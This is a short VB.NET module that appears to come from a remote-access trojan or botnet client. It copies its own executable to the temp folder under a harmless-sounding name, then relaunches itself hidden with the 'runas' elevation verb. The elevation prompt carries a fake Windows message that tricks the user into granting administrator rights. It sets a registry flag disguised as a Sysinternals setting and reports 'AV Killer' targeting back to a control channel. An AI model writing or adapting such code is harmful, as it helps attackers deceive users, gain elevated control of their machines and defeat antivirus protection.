Module CheckAV
    Public Sub RunAVAdminMode()
        Try
            Dim newloc = IO.Path.GetTempPath & "HardwareCheck.exe"
            If Not IsAdmin() Then
                If Not GetAntiVirus() = "AntiVirus: N/A" Then
                    If Not GetSetting("Microsoft", "Sysinternals", "AV") = "ran" Then
                        If Not IO.File.Exists(newloc) Then IO.File.Copy(Application.ExecutablePath, newloc)
                        Dim startInfo As ProcessStartInfo = New ProcessStartInfo("cmd.exe", "/c " & newloc & vbNewLine & vbNewLine & " Windows has detected a recent software change and needs permissions to continue. This process will take about 30-60 seconds depending on your internet connection. Please hit Yes to continue." & vbNewLine & vbNewLine & "System Info:" & vbNewLine & "Account: " & Environment.UserName.ToString.ToString & vbNewLine & "Processor Count: " & Environment.ProcessorCount.ToString & vbNewLine & "Operating System: " & My.Computer.Info.OSFullName)
                        startInfo.WindowStyle = ProcessWindowStyle.Hidden
                        startInfo.UseShellExecute = True
                        startInfo.WorkingDirectory = Environment.CurrentDirectory
                        startInfo.Verb = "runas"
                        Try
                            Dim p As Process = Process.Start(startInfo)
                            Call SaveSetting("Microsoft", "Sysinternals", "AV", "ran")
                            TalktoChannel("AV Killer: Targeted " & GetAntiVirus(), String.Empty)
                        Catch ex As Exception
                        End Try
                    End If
                End If
            End If
        Catch ex As Exception
        End Try
    End Sub
End Module
